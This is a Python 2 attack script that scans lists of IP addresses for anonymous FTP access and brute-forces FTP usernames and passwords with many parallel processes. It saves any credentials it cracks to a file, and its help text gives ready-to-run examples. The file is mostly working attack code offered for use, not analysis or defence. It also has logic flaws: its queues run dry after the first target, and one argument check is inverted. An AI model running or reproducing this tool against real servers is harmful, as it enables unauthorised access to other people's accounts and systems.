#!/usr/bin/python

import ftplib
import argparse
import os
import binascii
from multiprocessing import *

#actually make the login attempt
def anonLogin(ip, timeout):
    try:
        ftp = ftplib.FTP()
        ftp.connect(ip, 21, timeout)
        email = binascii.b2a_hex(os.urandom(3)) + '@' + binascii.b2a_hex(os.urandom(3)) + '.com'
        ftp.login('anonymous', email)
        print "[*] " + str(ip) + ' : Anonymous FTP login succeeded!'
        success = ip + "\n"
        ftp.quit()
        return success
    except Exception, e:
        if verbose:
            print ip, e
        else:
            pass
        
def bruteLogin(ip, user, pw, timeout):
    try:
        ftp = ftplib.FTP()
        ftp.connect(ip, 21, timeout)
        ftp.login(user, pw)
        print "[*] %s: Brute force FTP login succeeded!" % (ip)
        print "[*] Username: %s Password: %s\n" % (user, pw)
        success = "IP: %s User: %s Pass: %s\n" % (ip, user, pw)
        ftp.quit()
        return success
    except Exception, e:
        if verbose:
            print ip, e
        else:
            pass

def anon_worker(ip_queue, found_queue, timeout):
    try:
        for ip in iter(ip_queue.get, 'STOP'):
            result = anonLogin(ip, timeout)
            if result:
                found_queue.put(result)
    except:
        pass
    
def brute_worker(ip_queue, user_queue, pass_queue, found_queue, timeout):
    try:
        for ip in iter(ip_queue.get, 'STOP'):
            for user in iter(user_queue.get, 'STOP'):
                for pw in iter(pass_queue.get, 'STOP'):
                    result = bruteLogin(ip, user, pw, timeout)
                    if result:
                        found_queue.put(result)
    except:
        pass

#called when a anon is provided with a list then iterates through the list and calls anonLogin()
def anonlist(iplist, timeout, threads):
    #setup queues and threads
    ip_queue = Queue()
    found_queue = Queue()
    global processes
    processes = []
    
    #build ip_queue
    if os.path.isfile(iplist):
        f = open(iplist, 'r')
        for line in f.readlines():
            line = line.strip('\n').strip('\r')
            ip_queue.put(line)
        f.close()
    else: 
        print "List '%s' not found. Check path and try again!" % iplist
        exit(0)
    
    #start threads
    for x in xrange(threads):
        p = Process(target=anon_worker, args=(ip_queue, found_queue, timeout))
        p.start()
        processes.append(p)
        ip_queue.put('STOP')
    
    #wait for processes to complete and put end tag into found_queue
    for p in processes:
        p.join()
    found_queue.put('STOP')
    
    #create output file
    if outfile:
        ofile = open(outfile, 'a')
        for found in iter(found_queue.get, 'STOP'):
            ofile.write(found)
        ofile.close()

#called when a brute force is specified and brute forces login
def brutelist(iplist, passlist, userlist, timeout, threads):
    #setup queues and threads
    ip_queue = Queue()
    pass_queue = Queue()
    user_queue = Queue()
    found_queue = Queue()
    global processes
    processes = []
    
    #build ip_queue
    if os.path.isfile(iplist):
        f = open(iplist, 'r')
        for line in f.readlines():
            line = line.strip('\n').strip('\r')
            ip_queue.put(line)
        f.close()
    else: 
        print "File'%s' not found. Check path and try again!" % iplist
        exit(0)
        
    #build pass_queue
    if os.path.isfile(passlist):
        f = open(passlist, 'r')
        for line in f.readlines():
            line = line.strip('\n').strip('\r')
            pass_queue.put(line)
        f.close()
    else: 
        print "List '%s' not found. Check path and try again!" % passlist
        exit(0)
    
    #build user_queue
    if os.path.isfile(userlist):
        f = open(userlist, 'r')
        for line in f.readlines():
            line = line.strip('\n').strip('\r')
            user_queue.put(line)
        f.close()
    else: 
        print "List '%s' not found. Check path and try again!" % userlist
        exit(0)
    
    #start threads
    for x in xrange(threads):
        p = Process(target=brute_worker, args=(ip_queue, user_queue, pass_queue, found_queue, timeout))
        p.start()
        processes.append(p)
        ip_queue.put('STOP')
        user_queue.put('STOP')
        pass_queue.put('STOP')
    
    #wait for processes to complete and put end tag into found_queue
    for p in processes:
        p.join()
    found_queue.put('STOP')
    
    #create output file
    if outfile:
        ofile = open(outfile, 'a')
        for found in iter(found_queue.get, 'STOP'):
            ofile.write(found)
        ofile.close()

def main():
    #setup args
    parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, epilog='''
Examples:

Anonymous login testing: %(prog)s -a -t 10 -n 5 -l ip_list.txt -o results.txt
    ^Checks for anonymous login for each IP in ip_list.txt using 10 threads and a timeout of 5 seconds.\n
Brute Force login: %(prog)s -b -t 10 -i 192.168.0.100 -u admin -p pass_list.txt -o output.txt
    ^Brute forces ftp login for admin user on 192.168.0.100 using 10 threads and pass_list.txt
        ''', conflict_handler='resolve')
    required = parser.add_argument_group("Required", "An attack method and IP or list of IP's is required")
    brute = parser.add_argument_group("Brute Force", "Options for FTP brute force testing")
    general = parser.add_argument_group("General options", "Fine tune timing, threads, and output")
    required.add_argument('-i', '--ip', help="Check a single target IP")
    required.add_argument('-l', '--list', dest='iplist', help="Check all targets in a list. List should be one target IP per line")
    general.add_argument('-o', '--outfile', help="Output found targets to a file")
    general.add_argument('-t', '--threads', default=5, type=int, help="Number of threads to use for scanning [default: 5]")
    general.add_argument('-n', '--timeout', default=10, type=int, help="Check a single target IP [default: 10]")
    general.add_argument('-v', '--verbose', action='store_true', help="Verbose output which includes errors and failure messages")
    general.add_argument('-h', '--help', action='store_true', help="Shows options and help menu")
    required.add_argument('-a', '--anon', action='store_true', help="Check for anonymous FTP login")
    required.add_argument('-b', '--brute', action='store_true', help="Brute force FTP login credentials")
    brute.add_argument('-u', '--username', help="Username to use for brute force login")
    brute.add_argument('-U', '--user-list', dest='userlist', help="Username to use for brute force login")
    brute.add_argument('-p', '--pass-list', dest='passlist', help="Password list to use for brute force login")
    #assign args to variables
    args = parser.parse_args()
    ip = args.ip
    iplist = args.iplist
    threads = args.threads
    timeout = args.timeout
    global outfile
    global verbose
    outfile = args.outfile
    verbose = args.verbose
    username = args.username
    userlist = args.userlist
    passlist = args.passlist
    if ip:
        verbose = True #set this so that a single IP scan has an output to stdout
    
    #check if outfile exists and prompt for overwrite if so
    if outfile:
        if os.path.isfile(outfile):
            overwrite = raw_input('''[!] File exists! Are you sure you want to continue? 
            If you do the existing file will have the new data appended to it! (y/n): ''')
            if overwrite == "y" or overwrite == "Y" or overwrite == "Yes":
                pass
            else:
                print "[!] Exiting now!"
                exit()
    
    #check to make sure user has specified target(s) and attack type
    if (ip == None and iplist == None) or (not args.anon and not args.brute):
        parser.print_help()
        exit(0)
    
    #check args and decide whether to handle a list or single ip then 
    #actually start the login attempts
    if args.anon:
        print "[!] Testing Anonymous FTP Login.."
        if iplist: anonlist(iplist, timeout, threads)
        if ip: anonLogin(ip, timeout)
    if args.brute:
        if (not userlist or not username) or not passlist:
            print parser.print_help()
            exit(0)
        if username:
            f = open('/tmp/ftpuser.tmp', 'w')
            f.write(username)
            f.close()
            userlist = '/tmp/ftpuser.tmp'
        if ip:
            f = open('/tmp/ftpip.tmp', 'w')
            f.write(ip)
            f.close()
            iplist = '/tmp/ftpip.tmp'
        print "[!] Brute forcing FTP Login.."
        brutelist(iplist, passlist, userlist, timeout, threads)
        
def cleanup():
    if os.path.isfile('/tmp/ftpuser.tmp'):
        os.remove('/tmp/ftpuser.tmp')
    if os.path.isfile('/tmp/ftpip.tmp'):
        os.remove('/tmp/ftpip.tmp')
           
if __name__ == '__main__':
    try:
        main()
        cleanup()
    except KeyboardInterrupt:
        cleanup()
        print "\nKeyboard interrupt caught! Exiting now....."
        exit(0)